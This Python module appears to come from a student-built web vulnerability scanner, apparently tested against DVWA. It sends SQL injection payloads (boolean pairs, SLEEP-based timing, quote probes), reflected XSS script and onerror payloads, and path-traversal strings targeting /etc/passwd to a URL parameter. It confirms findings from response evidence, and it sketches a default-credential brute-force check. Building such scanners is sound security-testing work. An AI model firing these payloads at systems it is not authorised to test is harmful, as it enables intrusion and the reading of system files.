"""
vuln/vuln_detector.py — PHASE 3 (Weeks 13-18)

Rule-based only, per Phase 3 scope decision -- no AI hooks, no --ai flag,
no ANTHROPIC_API_KEY gating here. The AI-assisted false-positive triage
layer originally scoped for this phase is deferred and will be built
later alongside Phase 5's AI report generator, in one dedicated "AI
integration" pass once API billing is set up.

Every detector below follows the same rule: a finding is only marked
confirmed=True if we can point to actual verified evidence that the
backend behaved differently because of the payload -- not just "the
payload string showed up somewhere" or "we got a 200 OK". That's the
false-positive discipline this phase exists to build.

Finding schema (dict, matches the plain-dict convention already used
by scanner/port_scanner.py -- no new class introduced):
    {
        "type": "SQLi" | "XSS" | "LFI",
        "param": str,
        "payload": str,
        "severity": "high" | "medium" | "low",
        "evidence": str,               # human-readable proof of the finding
        "confirmed": bool,             # True only if actually verified
        "verification_method": str,    # "boolean_diff" | "time_based" |
                                        # "error_signature" |
                                        # "reflected_unescaped" |
                                        # "content_pattern_match"
    }
"""

import json
import os
import re
import time
import uuid
import requests
from phantomstrike.core.config import OUTPUT_DIR, HTTP_REQUEST_TIMEOUT
from phantomstrike.utils import logger


# --- SQLi -----------------------------------------------------------------

# Used for error-signature probing only. NOTE: the original stub's list
# included a SLEEP(5) payload here too -- pulled out into its own
# dedicated time-based check below instead, so this loop doesn't burn an
# extra 5+ seconds sending a timing payload to a check that isn't timing
# anything.
SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
]

# TRUE/FALSE pairs for boolean-based confirmation. Each pair is designed
# so the TRUE condition should return more/different data than the FALSE
# condition IF the input reaches the query unsanitized. Several shapes
# are tried since one comment style might work where another gets
# filtered (numeric vs string context, comment style, etc.).
SQLI_BOOLEAN_PAIRS = [
    ("1' OR '1'='1", "1' OR '1'='2"),
    ("1) OR (1=1", "1) OR (1=2"),
    ("1 OR 1=1", "1 OR 1=2"),
]

SQLI_SLEEP_PAYLOAD = "1' OR SLEEP(5)-- -"
SQLI_TIME_DELAY_SECONDS = 5

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "sqlite3.operationalerror",
    "ora-01756",
    "ora-00933",
    "pg_query()",
    "postgresql query failed",
]

# --- XSS --------------------------------------------------------------

# {token} gets replaced with a fresh uuid4 fragment on every run, so a
# "confirmed" match can only mean OUR payload came back unescaped --
# never a coincidental string already present on the page.
XSS_PAYLOAD_TEMPLATES = [
    "<script>alert('{token}')</script>",
    "\"><script>alert('{token}')</script>",
    "<img src=x onerror=alert('{token}')>",
]

# --- LFI ----------------------------------------------------------------

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "../../../../etc/passwd%00",
    # Bare absolute path, no traversal at all. Some includes (e.g.
    # `include($_GET['page'])` with no path prefix concatenation) pass
    # this straight through -- confirmed via direct curl testing against
    # DVWA-low, where traversal payloads returned nothing but this did.
    "/etc/passwd",
]

# Matches a real /etc/passwd root entry -- this is the actual proof of
# file read, not just "response looks different" or "status 200".
LFI_PASSWD_PATTERN = re.compile(r"root:.*?:0:0:")


class VulnDetector:
    def __init__(self, target_url: str, session_cookie: str = None, extra_params: dict = None):
        self.target_url = target_url
        self.session_cookie = session_cookie  # needed for authenticated DVWA testing
        # Static params merged into every request alongside the payload --
        # e.g. {"Submit": "Submit"} for DVWA, which silently no-ops the
        # query without its submit-button param present. Discovered by
        # comparing raw curl with/without Submit=Submit during Phase 3
        # testing: identical payload, but no query executed without it.
        self.extra_params = extra_params or {}
        self.findings = []

    # --- shared helpers ---------------------------------------------------

    def _send(self, param_name: str, payload: str):
        """
        Send `payload` as `param_name` against self.target_url.
        Returns the Response object, or None if the request itself failed
        (timeout, connection refused, DNS failure, etc.) -- callers must
        treat None as "couldn't test this payload", never as a negative
        result. Same graceful-degradation pattern as crt.sh in Phase 1.

        self.session_cookie is a raw cookie header string, e.g.
        "PHPSESSID=xxx; security=low" -- copy-pasted straight from
        devtools. Sent as a literal Cookie header rather than built
        into a dict, since targets like DVWA gate content behind
        MULTIPLE cookies (session + security level), not just one.
        """
        headers = {"Cookie": self.session_cookie} if self.session_cookie else None
        params = {param_name: payload, **self.extra_params}
        try:
            return requests.get(
                self.target_url,
                params=params,
                headers=headers,
                timeout=HTTP_REQUEST_TIMEOUT,
            )
        except requests.exceptions.RequestException as e:
            logger.warning(f"Request failed for payload {payload[:50]!r}: {e}")
            return None

    @staticmethod
    def _make_finding(vuln_type, param, payload, severity, evidence, confirmed, verification_method):
        return {
            "type": vuln_type,
            "param": param,
            "payload": payload,
            "severity": severity,
            "evidence": evidence,
            "confirmed": confirmed,
            "verification_method": verification_method,
        }

    # --- detectors ----------------------------------------------------------

    def detect_sqli(self, param_name: str) -> list:
        """
        Three independent confirmations, each proving the backend query
        actually changed because of our input -- not just guessing from
        the payload string itself:
          1. boolean_diff    -- TRUE vs FALSE condition, compare response bodies
          2. time_based      -- SLEEP(5) payload vs baseline response time
          3. error_signature -- DB error string reflected back (secondary,
             lower-confidence: proves the input reached the query
             unsanitized, doesn't by itself prove exploitability)
        """
        findings = []
        logger.info(f"Testing '{param_name}' for SQL injection...")

        # 1. Boolean-based
        for true_payload, false_payload in SQLI_BOOLEAN_PAIRS:
            true_resp = self._send(param_name, true_payload)
            false_resp = self._send(param_name, false_payload)
            if true_resp is None or false_resp is None:
                continue

            len_diff = abs(len(true_resp.text) - len(false_resp.text))
            if len_diff > 20:  # ignore small diffs (timestamps/nonces/etc.)
                evidence = (
                    f"TRUE payload '{true_payload}' returned {len(true_resp.text)} bytes, "
                    f"FALSE payload '{false_payload}' returned {len(false_resp.text)} bytes "
                    f"(diff={len_diff})"
                )
                findings.append(self._make_finding(
                    "SQLi", param_name, true_payload, "high", evidence,
                    True, "boolean_diff",
                ))
                logger.finding("high", f"Boolean-based SQLi confirmed on '{param_name}'")
                break  # one confirmed pair is enough evidence for this param

        # 2. Time-based (catches blind SQLi with no visible output difference)
        baseline_start = time.time()
        baseline_resp = self._send(param_name, "1")
        baseline_elapsed = time.time() - baseline_start

        if baseline_resp is not None:
            sleep_start = time.time()
            sleep_resp = self._send(param_name, SQLI_SLEEP_PAYLOAD)
            sleep_elapsed = time.time() - sleep_start

            if (sleep_resp is not None
                    and baseline_elapsed < 2.0
                    and sleep_elapsed > (SQLI_TIME_DELAY_SECONDS - 1)):
                evidence = (
                    f"baseline={baseline_elapsed:.2f}s, "
                    f"SLEEP({SQLI_TIME_DELAY_SECONDS}) payload={sleep_elapsed:.2f}s"
                )
                findings.append(self._make_finding(
                    "SQLi", param_name, SQLI_SLEEP_PAYLOAD, "high", evidence,
                    True, "time_based",
                ))
                logger.finding("high", f"Time-based blind SQLi confirmed on '{param_name}' -- {evidence}")

        # 3. Error-signature (secondary/lower-confidence signal)
        for payload in SQLI_PAYLOADS:
            resp = self._send(param_name, payload)
            if resp is None:
                continue
            body_lower = resp.text.lower()
            for sig in SQL_ERROR_SIGNATURES:
                if sig in body_lower:
                    evidence = f"Response contained DB error signature: '{sig}'"
                    findings.append(self._make_finding(
                        "SQLi", param_name, payload, "medium", evidence,
                        True, "error_signature",
                    ))
                    logger.finding("medium", f"Error-based SQLi signal on '{param_name}' -- {sig}")
                    break  # one signature match per payload is enough

        return findings

    def detect_xss(self, param_name: str) -> list:
        """
        Reflected XSS only (stored XSS is the stretch goal noted in the
        original stub). A finding is confirmed only if the EXACT payload
        string -- including angle brackets -- comes back verbatim. If the
        server HTML-encodes it (&lt;script&gt;...) that's proof it's NOT
        vulnerable, and we correctly report nothing.
        """
        findings = []
        logger.info(f"Testing '{param_name}' for reflected XSS...")

        for template in XSS_PAYLOAD_TEMPLATES:
            token = uuid.uuid4().hex[:8]
            payload = template.format(token=token)
            resp = self._send(param_name, payload)
            if resp is None:
                continue

            if payload in resp.text:
                evidence = f"Unescaped payload reflected verbatim (token={token}): {payload}"
                findings.append(self._make_finding(
                    "XSS", param_name, payload, "high", evidence,
                    True, "reflected_unescaped",
                ))
                logger.finding("high", f"Reflected XSS confirmed on '{param_name}' (token={token})")

        return findings

    def detect_lfi(self, param_name: str) -> list:
        """
        Confirms via actual /etc/passwd content pattern match -- not
        "response changed" or "status 200", both of which are unreliable
        (a 500 error page changes the response too, and plenty of normal
        requests return 200).
        """
        findings = []
        logger.info(f"Testing '{param_name}' for local file inclusion...")

        for payload in LFI_PAYLOADS:
            resp = self._send(param_name, payload)
            if resp is None:
                continue

            match = LFI_PASSWD_PATTERN.search(resp.text)
            if match:
                evidence = f"Response contains passwd entry: {match.group(0)}"
                findings.append(self._make_finding(
                    "LFI", param_name, payload, "high", evidence,
                    True, "content_pattern_match",
                ))
                logger.finding("high", f"LFI confirmed on '{param_name}' -- {evidence}")

        return findings

    def check_default_creds(self, login_url: str, creds_list: list = None) -> list:
        """
        TODO (bonus, if time allows):
        - Try a small list of common default credential pairs
          (admin/admin, admin/password, root/root, etc.) against a
          login form using `requests.post()`.
        - Detect success by checking for a redirect, a cookie being set,
          or absence of a "login failed" string in the response.
        - Keep this list SHORT and only test against systems you own --
          this is functionally a brute force attack.
        """
        logger.warning("check_default_creds() not implemented -- optional, Phase 3")
        raise NotImplementedError("Optional -- build if time allows")

    def run_all(self, param_name: str) -> list:
        """
        Orchestrates all detectors against a single parameter and saves
        results.
        """
        logger.info(f"Starting vulnerability scan against {self.target_url}")

        for detector in (self.detect_sqli, self.detect_xss, self.detect_lfi):
            try:
                self.findings.extend(detector(param_name))
            except NotImplementedError:
                pass

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        safe_name = self.target_url.replace("://", "_").replace("/", "_")
        out_path = os.path.join(OUTPUT_DIR, f"vuln_{safe_name}.json")
        with open(out_path, "w") as f:
            json.dump(self.findings, f, indent=2)

        confirmed_count = sum(1 for f in self.findings if f["confirmed"])
        logger.success(f"Vulnerability scan complete: {confirmed_count} confirmed finding(s), saved to {out_path}")
        return self.findings
